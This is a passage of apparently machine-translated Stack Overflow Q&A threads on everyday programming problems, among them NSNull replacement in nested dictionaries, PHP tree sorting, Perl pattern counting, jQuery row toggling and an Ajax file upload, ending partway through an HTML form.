> 赞同：0
> 
> 时间：2012-09-07T19:40:04.940

这里没有太多上下文，但假设您是在 Analyzer 中执行此操作的 EE 客户，则有几个相关选项：

1.  在“报告选项”下，或通过右键单击总计标签，有一个复选框可以切换显示包括过滤掉的值的总计。根据您未指定的版本，这可能默认包括过滤掉的值。取消选中它将纠正您的问题。

2.  另请查看度量的右键菜单中的“小计”选项，以确保您的聚合类型适合您的目的。

# ios - 替换嵌套 NSDictionary 中出现的 NSNull

> ID：12213822
> 
> 赞同：9
> 
> 时间：2012-08-31T10:49:07.333
> 
> 标签：ios, plist, nsdictionary, replace, nsnull

这个问题类似于[这个问题](https://stackoverflow.com/questions/8075147/replace-all-nsnull-objects-in-an-nsdictionary)，但是这种方法只适用于字典的根级别。

我正在寻找`NSNull`用空字符串替换任何出现的值，以便我可以将完整的字典保存到 plist 文件中（如果我将它与 NSNull 一起添加，则文件不会写入）。

然而，我的字典里面有嵌套的字典。像这样：

```
"dictKeyName" = {
    innerStrKeyName = "This is a string in a dictionary";
    innerNullKeyName = "<null>";
    innerDictKeyName = {
        "innerDictStrKeyName" = "This is a string in a Dictionary in another Dictionary";
        "innerDictNullKeyName" = "<null>";
    };
}; 
```

如果我使用：

```
@interface NSDictionary (JRAdditions)
- (NSDictionary *) dictionaryByReplacingNullsWithStrings;
@end

@implementation NSDictionary (JRAdditions)

- (NSDictionary *) dictionaryByReplacingNullsWithStrings {

    const NSMutableDictionary *replaced = [NSMutableDictionary dictionaryWithDictionary:self];
    const id nul = [NSNull null];
    const NSString *blank = @"";

    for(NSString *key in replaced) {
        const id object = [self objectForKey:key];
        if(object == nul) {
            [replaced setObject:blank forKey:key];
        }
    }
    return [NSDictionary dictionaryWithDictionary:replaced];
}

@end 
```

我得到这样的东西：

```
"dictKeyName" = {
    innerStrKeyName = "This is a string in a dictionary";
    innerNullKeyName = ""; <-- this value has changed
    innerDictKeyName = {
        "innerDictStrKeyName" = "This is a string in a Dictionary in another Dictionary";
        "innerDictNullKeyName" = "<null>"; <-- this value hasn't changed
    };
}; 
```

有没有办法`NSNull`从包括嵌套字典在内的所有字典中找到每个值......？

**编辑：** 数据是从 JSON 提要中提取的，因此我收到的数据是动态的（我不想在每次提要更改时都更新应用程序）。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-31T11:15:47.167

对该方法进行小的修改可以使其递归：

```
@interface NSDictionary (JRAdditions)
- (NSDictionary *) dictionaryByReplacingNullsWithStrings;
@end

@implementation NSDictionary (JRAdditions)

- (NSDictionary *) dictionaryByReplacingNullsWithStrings {
    const NSMutableDictionary *replaced = [NSMutableDictionary dictionaryWithDictionary: self];
    const id nul = [NSNull null];
    const NSString *blank = @"";

    for (NSString *key in self) {
        const id object = [self objectForKey: key];
        if (object == nul) {
            [replaced setObject: blank forKey: key];
        }
        else if ([object isKindOfClass: [NSDictionary class]]) {
            [replaced setObject: [(NSDictionary *) object dictionaryByReplacingNullsWithStrings] forKey: key];
        }
    }
    return [NSDictionary dictionaryWithDictionary: replaced];
} 
```

请注意，快速枚举现在打开**`self`**而不是**`replaced`**

使用上面的代码，这个例子：

```
NSMutableDictionary *dic1 = [NSMutableDictionary dictionary];
[dic1 setObject: @"string 1" forKey: @"key1.1"];
[dic1 setObject: [NSNull null] forKey: @"key1.2"];

NSMutableDictionary *dic2 = [NSMutableDictionary dictionary];
[dic2 setObject: @"string 2" forKey: @"key2.1"];
[dic2 setObject: [NSNull null] forKey: @"key2.2"];

[dic1 setObject: dic2 forKey: @"key1.3"];

NSLog(@"%@", dic1);
NSLog(@"%@", [dic1 dictionaryByReplacingNullsWithStrings]); 
```

呈现这个结果：

```
2012-09-01 08:30:16.210 Test[57731:c07] {
    "key1.1" = "string 1";
    "key1.2" = "<null>";
    "key1.3" =     {
        "key2.1" = "string 2";
        "key2.2" = "<null>";
    };
}
2012-09-01 08:30:16.212 Test[57731:c07] {
    "key1.1" = "string 1";
    "key1.2" = "";
    "key1.3" =     {
        "key2.1" = "string 2";
        "key2.2" = "";
    }; 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-03-21T08:04:47.183

它对我有用，我使用嵌套循环将包括 NSArray 在内的整个字典中的所有 NULL 替换为 nil。

```
- (NSDictionary *) dictionaryByReplacingNullsWithNil:(NSDictionary*)sourceDictionary {

    NSMutableDictionary *replaced = [NSMutableDictionary dictionaryWithDictionary:sourceDictionary];
    const id nul = [NSNull null];

    for(NSString *key in replaced) {
        const id object = [sourceDictionary objectForKey:key];
        if(object == nul) {
            [replaced setValue:nil forKey:key];
        }
    }
    return [NSDictionary dictionaryWithDictionary:replaced];
}

-(NSDictionary *) nestedDictionaryByReplacingNullsWithNil:(NSDictionary*)sourceDictionary
{
    NSMutableDictionary *replaced = [NSMutableDictionary dictionaryWithDictionary:sourceDictionary];
    const id nul = [NSNull null];
    const NSString *blank = @"";
    [sourceDictionary enumerateKeysAndObjectsUsingBlock:^(id key, id object, BOOL *stop) {
        object = [sourceDictionary objectForKey:key];
        if([object isKindOfClass:[NSDictionary class]])
        {
            NSDictionary *innerDict = object;
            [replaced setObject:[self nestedDictionaryByReplacingNullsWithNil:innerDict] forKey:key];

        }
        else if([object isKindOfClass:[NSArray class]]){
            NSMutableArray *nullFreeRecords = [NSMutableArray array];
            for (id record in object) {

                if([record isKindOfClass:[NSDictionary class]])
                {
                    NSDictionary *nullFreeRecord = [self nestedDictionaryByReplacingNullsWithNil:record];
                    [nullFreeRecords addObject:nullFreeRecord];
                }
            }
            [replaced setObject:nullFreeRecords forKey:key];
        }
        else
        {
            if(object == nul) {
                [replaced setObject:blank forKey:key];
            }
        }
    }];

    return [NSDictionary dictionaryWithDictionary:replaced];  
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-08-31T19:51:43.587

如果有人在 swift 1.2 中需要这个，下面是代码片段：

```
class func removeNullsFromDictionary(origin:[String:AnyObject]) -> [String:AnyObject] {
    var destination:[String:AnyObject] = [:]
    for key in origin.keys {
        if origin[key] != nil && !(origin[key] is NSNull){
            if origin[key] is [String:AnyObject] {
                destination[key] = self.removeNullsFromDictionary(origin[key] as! [String:AnyObject])
            } else if origin[key] is [AnyObject] {
                let orgArray = origin[key] as! [AnyObject]
                var destArray: [AnyObject] = []
                for item in orgArray {
                    if item is [String:AnyObject] {
                        destArray.append(self.removeNullsFromDictionary(item as! [String:AnyObject]))
                    } else {
                        destArray.append(item)
                    }
                }
                destination[key] = destArray
            } else {
                destination[key] = origin[key]
            }
        } else {
            destination[key] = ""
        }
    }
    return destination
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-11-02T11:52:07.303

以下方法适用于任意数量的嵌套字典数组：

```
- (NSMutableDictionary *)dictionaryByReplacingNullsWithStrings:(NSDictionary *)jobList
{
    NSMutableDictionary *replaced = [NSMutableDictionary dictionaryWithDictionary:jobList];
    const id nul = [NSNull null];
    const NSString *blank = @"";

    for (NSString *key in [replaced allKeys])
    {
        id object = [replaced objectForKey:key];
        if (object == nul)
        {
            [replaced setObject:blank
                         forKey:key];
        }
        else
        if ([object isKindOfClass:[NSDictionary class]])
        {
            [replaced setObject:[self replaceNullInNested:object]
                         forKey:key];
        }
        else
        if ([object isKindOfClass:[NSArray class]])
        {
            NSMutableArray *dc = [[NSMutableArray alloc] init];
            for (NSDictionary *tempDict in object)
            {
                [dc addObject:[self dictionaryByReplacingNullsWithStrings:tempDict]];
            }
            [replaced setObject:dc
                         forKey:key];
        }
    }
    return replaced;
}

- (NSMutableDictionary *)replaceNullInNested:(NSDictionary *)targetDict
{
    // make it to be NSMutableDictionary in case that it is nsdictionary
    NSMutableDictionary *m = [targetDict mutableCopy];
    NSMutableDictionary *replaced = [NSMutableDictionary dictionaryWithDictionary:m];
    const id nul = [NSNull null];
    const NSString *blank = @"";

    for (NSString *key in [replaced allKeys])
    {
        const id object = [replaced objectForKey:key];
        if (object == nul)
        {
            [replaced setObject:blank
                         forKey:key];
        }
        else
        if ([object isKindOfClass:[NSArray class]])
        {
//            NSLog(@"found null inside and key is %@", key);
            // make it to be able to set value by create a new one
            NSMutableArray *a = [object mutableCopy];
            for (int i = 0; i < [a count]; i++)
            {
                for (NSString *subKey in [[a objectAtIndex:i] allKeys])
                {
                    if ([[object objectAtIndex:i] valueForKey:subKey] == nul)
                    {
                        [[object objectAtIndex:i] setValue:blank
                                                    forKey:subKey];
                    }
                }
            }
            // replace the updated one with old one
            [replaced setObject:a
                         forKey:key];
        }
    }
    return replaced;
} 
```

我根据我需要的功能使用了上面修改过的方法：

// 调用方法

```
NSMutableDictionary *sortedDict = [[NSMutableDictionary alloc] init];

for (NSString *key in jobList){
    NSMutableArray *tempArray = [[NSMutableArray alloc] init];

    for (NSDictionary *tempDict in [jobList objectForKey:key])
    {
        [tempArray addObject:[self dictionaryByReplacingNullsWithStrings:tempDict]];
    }
    [sortedDict setObject:tempArray forKey:key];
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T11:03:36.797

这段代码

```
@interface NSDictionary (JRAdditions)
    - (NSDictionary *) dictionaryByReplacingNullsWithStrings;
@end 
```

Monkey 修补 NSDictionary - 这意味着您可以调用 dictionaryByReplacing... 不仅在根目录上，而且在任何嵌套字典上都可以。

从设计的角度来看，我真的不同意这一点，但它确实解决了你的问题。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-31T11:30:25.153

试试这个：

```
@interface NSDictionary (JRAdditions)
 - (NSDictionary *) dictionaryByReplacingNullsWithStrings;
 -(NSDictionary *) nestedDictionaryByReplacingNullsWithStrings;
@end

@implementation NSDictionary (JRAdditions)

- (NSDictionary *) dictionaryByReplacingNullsWithStrings {

const NSMutableDictionary *replaced = [NSMutableDictionary dictionaryWithDictionary:self];
const id nul = [NSNull null];
const NSString *blank = @"";

for(NSString *key in replaced) {
    const id object = [self objectForKey:key];
    if(object == nul) {
        [replaced setObject:blank forKey:key];
    }
}
return [NSDictionary dictionaryWithDictionary:replaced];
}

-(NSDictionary *) nestedDictionaryByReplacingNullsWithStrings
{  
  const NSMutableDictionary *replaced = [NSMutableDictionary dictionaryWithDictionary:self];
  const id nul = [NSNull null];
  const NSString *blank = @"";
  for(id *item in replaced) {
    const id object = [self objectForKey:key];
    if([object isKindofClass:[NSDictionary class]])
    {
       NSDictionary *innerDict = object;
       [replaced setObject:[innerDict dictionaryByReplacingNullsWithStrings] forKey:key];

    }
    else
    {
     if(object == nul) {
        [replaced setObject:blank forKey:key];
     }
    }
 }
 return [NSDictionary dictionaryWithDictionary:replaced];  
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-10-24T13:23:55.547

该解决方案适用于数组和字典，也适用于嵌套数组和字典等（递归）。

```
- (NSDictionary *)writableDictionary:(NSDictionary *)dictionary
{
    NSMutableDictionary *mutableDictionary = [NSMutableDictionary dictionaryWithDictionary:dictionary];

    for (id key in mutableDictionary.allKeys)
    {
        id value = mutableDictionary[key];
        mutableDictionary[key] = [self writableValue:value];
    }

    return mutableDictionary;
}

- (NSArray *)writableArray:(NSArray *)array
{
    NSMutableArray *mutableArray = [NSMutableArray arrayWithArray:array];

    for (int i = 0; i < mutableArray.count; ++i)
    {
        id value = mutableArray[i];
        mutableArray[i] = [self writableValue:value];
    }

    return mutableArray;
}

- (id)writableValue:(id)value
{
    if ([value isKindOfClass:[NSNull class]])
    {
        value = @"";
    }
    else if ([value isKindOfClass:[NSDictionary class]])
    {
        value = [self writableDictionary:value];
    }
    else if ([value isKindOfClass:[NSArray class]])
    {
        value = [self writableArray:value];
    }
    return value;
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-07-22T17:49:57.037

如果您的字典中有数组，则上述答案不适合这种情况。看一下这个

```
+(NSMutableDictionary*)getValuesWithOutNull:(NSDictionary          
     *)yourDictionary{
       NSMutableDictionary *replaced = [NSMutableDictionary 
     dictionaryWithDictionary: yourDictionary];
      id nul = [NSNull null];
      NSString *blank = @"";

for (NSString *key in yourDictionary) {
    const id object = [yourDictionary objectForKey: key];
    if (object == nul) {
        [replaced setObject: blank forKey: key];
    }
    else if ([object isKindOfClass: [NSDictionary class]]) {
        [replaced setObject:[self getValuesWithOutNull:object] 
forKey:key];
    }
    else if([object isKindOfClass: [NSArray class]])
    {
        NSMutableArray *array  = [NSMutableArray 
arrayWithArray:object];
        for(int i = 0 ;i < array.count;i++)
        {
            NSDictionary *dict = [array objectAtIndex:i];
            [array replaceObjectAtIndex:i withObject:[self 
  getValuesWithOutNull:dict]];
        }
        [replaced setObject:array forKey:key];
    }
 }
  return  replaced;

} 
```

# c# - Windows Phone 中弹出窗口优于面板的优势

> ID：12213823
> 
> 赞同：0
> 
> 时间：2012-08-31T10:49:07.447
> 
> 标签：c#, .net, popup, windows-phone-7.1

我对`Popup`Windows Phone 中的控制很好奇。对我来说，它是某种具有`IsOpen`属性的面板。我应该使用它，当我只想在某些定义的上下文中呈现一些（例如按下按钮）时。

但是为什么不只使用普通的堆栈或网格面板，`Visiblity`当你想隐藏或显示它时使用呢？它的行为似乎相同。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-03T06:36:22.787

您可以使用 Popup 控件中的 Horizo​​ntalOffset /VerticalOffset 属性更改弹出窗口的水平和垂直位置。我们在网格和其他面板中没有该选项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-12T10:21:09.880

这是一个覆盖。它不会破坏页面布局，因为它显示在主要内容上方。当`StackPanel`或`Grid`应该添加到主要内容时，当它们显示时，它们会向下移动其他控件。

# objective-c - 为什么在使用 AVFoundation 时重新加载视图时我的 playerItemDidReachEnd 方法触发了两次？

> ID：12213830
> 
> 赞同：1
> 
> 时间：2012-08-31T10:49:37.060
> 
> 标签：objective-c, avfoundation

我在我的 avfoundation 视频播放器中循环播放视频：

```
NSString *loopPath = @"SubView/introCycle";
NSURL *fileURL = [[NSBundle mainBundle] URLForResource:loopPath withExtension:@"mp4"];
AVURLAsset *asset = [AVURLAsset URLAssetWithURL:fileURL options:nil];
NSString *tracksKey = @"tracks";
[asset loadValuesAsynchronouslyForKeys:@[tracksKey] completionHandler:^{
    // The completion block goes here.
    //NSLog(@"asset loaded asynchronously completed!");

    // Completion handler block.
    dispatch_async(dispatch_get_main_queue(),

                   ^{
                       NSError *error;
                       AVKeyValueStatus status = [asset statusOfValueForKey:tracksKey error:&error];

                       if (![self avPlayer] && status == AVKeyValueStatusLoaded) {
                           if(![self playerItem]){
                               self.playerItem = [AVPlayerItem playerItemWithAsset:asset];
                               [self.playerItem addObserver:self forKeyPath:@"status" options:0 context:AVMoviePlayerViewControllerStatusObservationContext];
                               self.avPlayer.actionAtItemEnd = AVPlayerActionAtItemEndNone;
                               [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(playerItemDidReachEnd:)
                                                                     name:AVPlayerItemDidPlayToEndTimeNotification
                                                                     object:[self.avPlayer currentItem]];
                           }
                           self.avPlayer = [AVPlayer playerWithPlayerItem:self.playerItem];
                           [self.VideoLoopView setPlayer:self.avPlayer];
                       }

                       else {
                           // You should deal with the error appropriately.
                           NSLog(@"The asset's tracks were not loaded:\n%@", [error localizedDescription]);
                       }
                   });
}]; 
```

在循环结束时，以下方法重新启动视频

```
int countRounds = 0;
- (void)playerItemDidReachEnd:(NSNotification *)notification {
    *//block 1 - this is what we like*
    if (notification.object == self.playerItem) {

        countRounds++;

        [self.playerItem seekToTime:kCMTimeZero];
        [self.avPlayer play];

        }
    }
    *// block 2 - this we don't like*
    else {
        NSInteger reason = [[notification.userInfo objectForKey:AVPlayerItemDidPlayToEndTimeNotification] integerValue];
        NSLog(@"reason: %i", reason);
    }
    NSLog(@"playerItemDidReachEnd, starting round %i", countRounds);
} 
```

效果很好。仅执行块 1。日志显示

```
MainView did load 
playerItemDidReachEnd, starting round 1 
playerItemDidReachEnd, starting round 2 
... 
```

然后我加载另一个视图并返回到视频循环视图。当我离开主视图时

```
- (void)viewDidDisappear:(BOOL)animated
{ 
    [[NSNotificationCenter defaultCenter]   removeObserver:self
                                            name:AVPlayerItemDidPlayToEndTimeNotification
                                            object:[self.avPlayer currentItem]];
    [self.avPlayer pause];
    self.avPlayer = nil;
    self.playerItem = nil;

    [super viewDidDisappear:animated];
    NSLog(@"MainView DidDisappear");
} 
```

当我重新加载主视图时，视频被重新加载并且循环播放良好。但现在在循环结束时，块 1 和块 2 都被执行，记录

```
MainView did load (from old log above)
playerItemDidReachEnd, starting round 1 *(from old log above)*
playerItemDidReachEnd, starting round 2 *(from old log above)*
MainView DidDisappear   *(leaving the main view and loading a new one)*
MainView did load *(coming back to main view)*
reason: 0 *(block 2 is executed, triggered by what exactly? WHERE DOES THIS COME FROM?)*
playerItemDidReachEnd, starting round 2
playerItemDidReachEnd, starting round 3 *(this comes from block 1 - we like)*
reason: 0
playerItemDidReachEnd, starting round 3
playerItemDidReachEnd, starting round 4
reason: 0
playerItemDidReachEnd, starting round 4
playerItemDidReachEnd, starting round 5 
```

所以在循环结束时 playerItemDidReachEnd 方法被触发两次。这是为什么？这是从哪里来的？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-02T17:46:08.170

您可以通过使用避免从错误的通知器触发

```
if (notification.object == self.playerItem) ... 
```

# sql-server - 将 HDFS 上的数据导入 SQL Server 或将 HDFS 上的数据导出到 SQL Server

> ID：12213833
> 
> 赞同：4
> 
> 时间：2012-08-31T10:49:52.917
> 
> 标签：sql-server, hadoop, cloudera, sqoop

我一直试图找出将数据从 HDFS 移植到 SQL Server 的最佳方法。

*   我是使用 SQL Server 2008 R2 的 sqoop Hadoop 连接器从 Cloudera Hadoop 导入数据还是
*   我是否使用 sqoop 将 Cloudera Hadoop 中的数据导出到 SQL Server

根据我阅读的大量链接，我确信两者都是可能的

*   [http://www.cloudera.com/blog/2011/10/apache-sqoop-overview/](http://www.cloudera.com/blog/2011/10/apache-sqoop-overview/)
*   [http://www.microsoft.com/en-in/download/details.aspx?id=27584](http://www.microsoft.com/en-in/download/details.aspx?id=27584)

但是当我在寻找可能在配置和维护级别上升的问题时，我没有正确的答案。

我强烈认为我应该进行导入，但我对排除和维护时不时出现的问题感到不舒服。

有人可以分享他们对什么是最好的想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T12:49:11.947

您的两个选项都使用相同的方法：Apache Sqoop 的导出实用程序。与使用 Apache Sqoop 提供的通用连接器相比，使用许可的 Microsoft 连接器/驱动程序 jar 应该可以为任务带来更高的性能。

在维护方面，一旦您正常工作，就应该没有。只要驱动程序 jar 支持正在使用的 SQL Server 版本，它就应该继续按正常预期工作。

在配置方面，您最初可能必须手动调整以找到`-m`导出工具启动的导出 MapReduce 作业的最佳并行值。使用太高的值会导致数据库端出现问题，而使用太低的值不会给您理想的性能。这里需要一些试验和错误来达到正确的`-m`值，以及数据库的加载周期的知识，以便正确设置并行度。

导出工具用户的 Apache Sqoop (v1)[文档页面](http://sqoop.apache.org/docs/1.4.3/SqoopUserGuide.html#_literal_sqoop_export_literal)还列出了导出作业失败的一组常见原因。您可能想在[此处查看这些](http://sqoop.apache.org/docs/1.4.3/SqoopUserGuide.html#_failed_exports)内容。

在 MapReduce 方面，您可能还希望为此类外部写入作业专用定义的调度程序池或队列，因为它们可能对业务至关重要，并且调度程序喜欢`FairScheduler`并`CapacityScheduler`帮助定义每个池或队列上的 SLA 保证，以便作业获得足够的资源在它们启动时运行。

# php - 根据父级排序数组；一维数组中的树

> ID：12213835
> 
> 赞同：10
> 
> 时间：2012-08-31T10:49:57.640
> 
> 标签：php, arrays, sorting, tree

如何在他们各自的父母之后对所有孩子的数组进行排序？我想我正在尝试将一棵树存储在一维数组中。我试图用 usort 来解决这个问题，但我认为它不是适合这项工作的工具。

示例输入数组：

```
array (0 => array ( 'id' => '1', 'parent' => '0', ), 
1 => array ( 'id' => '2', 'parent' => '1', ), 
2 => array ( 'id' => '3', 'parent' => '0', ), 
3 => array ( 'id' => '5', 'parent' => '0', ), 
4 => array ( 'id' => '17', 'parent' => '3', ), 
5 => array ( 'id' => '31', 'parent' => '2', ), 
6 => array ( 'id' => '32', 'parent' => '2', )) 
```

示例输出：

![根据描述排序的数组](../Images/d0de2813cc007de5c5e616dd973e1856.png)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T10:53:55.003

首先构建一个实际的树，然后展平该树：

```
$array = array (0 => array ( 'id' => '1', 'parent' => '0', ),
                1 => array ( 'id' => '2', 'parent' => '1', ),
                2 => array ( 'id' => '3', 'parent' => '0', ),
                3 => array ( 'id' => '5', 'parent' => '0', ),
                4 => array ( 'id' => '17', 'parent' => '3', ),
                5 => array ( 'id' => '31', 'parent' => '2', ),
                6 => array ( 'id' => '32', 'parent' => '2', ));

/* Building a tree. We also save a map of references to avoid                                
   searching the tree for nodes */

//Helper to create nodes                                                                     
$tree_node = function($id, $parent) {
  return array('id' => $id, 'parent' => $parent, 'children' => array());
};

$tree = $tree_node(0, null); //root node                                                     
$map = array(0 => &$tree);
foreach($array as $cur) {
  $id = (int) $cur['id'];
  $parentId = (int) $cur['parent'];
  $map[$id] =& $map[$parentId]['children'][];
  $map[$id] = $tree_node($id, $parentId);
}

//Now recursively flatten the tree:                                                          
function flatter($node) {
  //Create an array element of the node                                            
  $array_element = array('id' => (string) $node['id'],
                         'parent' => (string) $node['parent']);
  //Add all children after me                                                                
  $result = array($array_element);
  foreach($node['children'] as $child) {
    $result = array_merge($result, flatter($child));
  }
  return $result;
}

$array = flatter($tree);
array_shift($array); //Remove the root node, which was only added as a helper                

print_r($array); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-31T12:01:58.673

```
<?php

/**
 * @author Prasath A.R
 * @copyright 2012
 * @Date 2012-8-31 17:14
 */

$array = array (0 => array ( 'id' => '1', 'parent' => '0', ),
                1 => array ( 'id' => '2', 'parent' => '1', ),
                2 => array ( 'id' => '3', 'parent' => '0', ),
                3 => array ( 'id' => '5', 'parent' => '0', ),
                4 => array ( 'id' => '17', 'parent' => '3', ),
                5 => array ( 'id' => '31', 'parent' => '2', ),
                6 => array ( 'id' => '32', 'parent' => '2', ));

print_r($array);
echo "<br />";

for($i=0;$i<count($array);$i++)
{
for($j=$i;$j<count($array);$j++)
{
        if($array[$i]['parent']>$array[$j]['parent'])
        {
            $temp=$array[$i];
            $array[$i]=$array[$j];
            $array[$j]=$temp;
        }
    }
}

echo "<h2>After Sorting</h2><br />";
print_r($array);

?> 
```

答案将是：

数组 ( [0] => 数组 ( [id] => 1 [父] => 0 )

```
[1] => Array
    (
        [id] => 2
        [parent] => 1
    )

[2] => Array
    (
        [id] => 3
        [parent] => 0
    )

[3] => Array
    (
        [id] => 5
        [parent] => 0
    )

[4] => Array
    (
        [id] => 17
        [parent] => 3
    )

[5] => Array
    (
        [id] => 31
        [parent] => 2
    )

[6] => Array
    (
        [id] => 32
        [parent] => 2
    ) 
```

)

排序后

数组 ( [0] => 数组 ( [id] => 1 [父] => 0 )

```
[1] => Array
    (
        [id] => 3
        [parent] => 0
    )

[2] => Array
    (
        [id] => 5
        [parent] => 0
    )

[3] => Array
    (
        [id] => 2
        [parent] => 1
    )

[4] => Array
    (
        [id] => 31
        [parent] => 2
    )

[5] => Array
    (
        [id] => 32
        [parent] => 2
    )

[6] => Array
    (
        [id] => 17
        [parent] => 3
    ) 
```

)

# perl - 计算一个模式在列文件的多行中出现的次数

> ID：12213840
> 
> 赞同：0
> 
> 时间：2012-08-31T10:50:03.493
> 
> 标签：perl

我有一个列文件如下

```
np  np  n_nom   3   {RP}    {RP}

paNiyappeVttirunna  VM_RP   V_RP    o   o   o

np  np  n_nom   -3  {/RP}   {/RP} 
```

接下来的几行是......

```
np   np n_nom   3   {RP}    {RP}

paNiya      VM_RP     V_RP    o  o   o

np  np  n_nom   -3  {/RP} 
```

文件就这样继续下去。

我想计算同时出现 {RP} {RP} 和 {/RP} {/RP} 的文件部分的数量。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:14:02.317

This is done very simply using backreferences in the regular expression

The program below searches for any occurrence of `{RP}` or `{/RP}` followed by some whitespace and the same string again

It expects the data file as a command line parameter

```
use strict;
use warnings;

my $count;

while (<>) {
  $count++ if m|(\{/?RP\})\s+\1|;
}

print "$count occurrences"; 
```

**output**

```
3 occurrences 
```

* * *

**Update**

Your description of the problem is very unclear but I have done my best at reinterpreting it. This code looks for all cases where a line containing `{/RP} <some whitespace> {/RP}` is followed immediately by a line containing `{RP} <some whitespace> {RP}`. All blank input lines are ignored

```
use strict;
use warnings;

my @pair;
my $count;

while (<>) {
  next unless /\S/;
  push @pair, $_;
  next unless @pair >= 2;
  shift @pair while @pair > 2;
  if ($pair[0] =~ m|\{/RP\}\s+\{/RP\}| and $pair[1] =~ m|\{RP\}\s+\{RP\}|) {
    $count++;
    @pair = ();
  }
}

print "$count occurrences\n"; 
```

**output**

```
1 occurrences 
```

* * *

**Update**

OK lets try again. This program checks the third and fourth whitespace-separated columns of every line. Whenever it sees a pair of `{RP}` it sets `$depth` to `1`, and Whenever it sees a pair of `{/RP}` it sets $depth it to zero, incrementing `$count` if `$depth` was previously non-zero

Note that all lines containing only a single `{RP}` or `{/RP}` are simply ignored. It is impossible to tell from your description what action you want in this circumstance

```
use strict;
use warnings;

my $depth;
my $count = 0;

while (<>) {
  my @fields = map $_ // '', (split)[4,5];
  if (grep($_ eq '{RP}', @fields) == 2) {
    $depth = 1;
  }
  elsif (grep($_ eq '{/RP}', @fields) == 2) {
    $count++ if $depth;
    $depth = 0;
  }
}

print "$count occurrences\n"; 
```

**output**

```
1 occurrences 
```

# jquery - 使用 jquery 切换表格行显示

> ID：12213844
> 
> 赞同：1
> 
> 时间：2012-08-31T10:50:24.947
> 
> 标签：jquery

我有一个表格，其中每一行都显示嵌套区域的数据。当我说嵌套时，我并不是指 HTML，而是指这些区域如何相互关联。包含多个区域的多个国家，这些区域又包含多个子区域（LA - 地方当局）。由于 LA 行太多，默认情况下它们是隐藏的。

我希望这些行的行为类似于 Windows 文件夹视图，其中单击区域将显示/隐藏它的 LA 行。单击国家名称将显示/隐藏其所有地区及其 LA。您之前在其他国家/地区显示/隐藏的任何内容都不会受到影响。

我通过 .nextUntil 方法在区域级别工作。我不知道如何解决的是，国家级别的相同方法不起作用，因为它按预期隐藏了区域，但它显示了隐藏的 LA，因为它只是使用了一个工具。

无论 LA 行是显示还是隐藏，有关如何单击国家名称隐藏区域及其 LA 的任何想法？再次单击时，可以很好地显示这些 LA 的先前状态，但不是必需的。全部关闭就好了。

在这里演示：http: [//fluent-interaction.co.uk/temp/table/tabletest.html](http://fluent-interaction.co.uk/temp/table/tabletest.html)

我的 jQuery：

```
$(document).ready(function() {
$(".rowLA").hide();
$(".rowCountry th p").addClass("toggleClose");
$(".rowCountry th p").click(function() {
    $(this).closest(".rowCountry").nextUntil(".rowCountry").toggle();
    $(this).toggleClass("toggleClose");
});
$(".rowRegion th p").click(function() {
    $(this).closest(".rowRegion").nextUntil(".rowRegion, .rowCountry").toggle();
    $(this).toggleClass("toggleClose");
}); 
```

});

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:20:36.093

尝试添加

```
$(this).closest(".rowCountry").nextUntil(".rowCountry",".rowLA").hide(); 
```

在此行之后：

```
$(this).closest(".rowCountry").nextUntil(".rowCountry").toggle(); 
```

这将隐藏该国家/地区内的所有 LA。

我想知道为什么您在所有语句中都使用了最接近（）...！

# php - Ajax 上传不正常 - 上传 pdf 文件时

> ID：12213845
> 
> 赞同：0
> 
> 时间：2012-08-31T10:50:32.157
> 
> 标签：php, ajax-upload

这是我的ajax代码：

```
$(function(){
    var cntUp = 0;
    var btnUpload=$('#upload_pdf');
    var status=$('#status');

    new AjaxUpload(btnUpload, {
        action: 'uplod_estimate_file.php',
        data: {saleid: $("#hid_saleid").val()},
        name: 'uploadfile_test',
        onSubmit: function(file, ext){
             if (! (ext && /^(jpg|pdf|jpeg)$/.test(ext))){ 
                // extension is not allowed 
                alert('Only JPG, PDF or JPEG files are allowed');
                return false;
            }
            this.setData({
                'saleid': $("#hid_saleid").val()
            });

            status.text('Uploading...');
        },
        onComplete: function(file, response){
            if (response.toLowerCase().indexOf("success") >= 0 ) {
                alert(response);
                /*
                var image='<img src="uploads/'+saleid+'/'+fname+'" alt=""  width="131px" height="125px"/>';
                $("#img0").html(image);*/

            }  else{
                $('<li></li>').appendTo('#files').text(file).addClass('error');
                //alert('error');
            }
        }
    });

}); 
```

这是表格：

```
<form name="frmvehdetails" id="frmvehdetails" method="post">

        <table cellpadding="3">
                  <tr>
            <td valign="top">VIN</td>
            <td>

                      <input class="frmIn" size="30"  name="car-vin" id="car-vin" type="text" value="" />
                      <input onclick="lookupVIN()" name="btnVin" type="button" value="Lookup" />
                      <br/>
                      <div id="vinDet" style="line-height: 20px; margin-bottom: 10px; margin-top: 10px;"></div></td>
          </tr>
                  <tr>
            <td>Year</td>
            <td><select name="car-years" id="car-years">
              </select></td>
          </tr>
                  <tr>
            <td>Make</td>
            <td><select name="car-makes" id="car-makes">
              </select></td>
          </tr>
                  <tr>
            <td>Model</td>
            <td><select name="car-models" id="car-models">
              </select></td>
          </tr>
          <tr>
            <td>Milage</td>
            <td><input type="text" name="car-milage" id="car-milage" value="" class="frmIn" /></td>
          </tr>

             <tr>
            <td>Repair Estimate</td>
            <td><input type="text" value="" id="car_estimate" name="car_estimate" class="frmIn"></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td><div id="upload_pdf" style="margin-bottom:10px;" >
                  <span>Upload File</span></div></td>
          </tr>

          <tr>
            <td>Reserve Price</td>
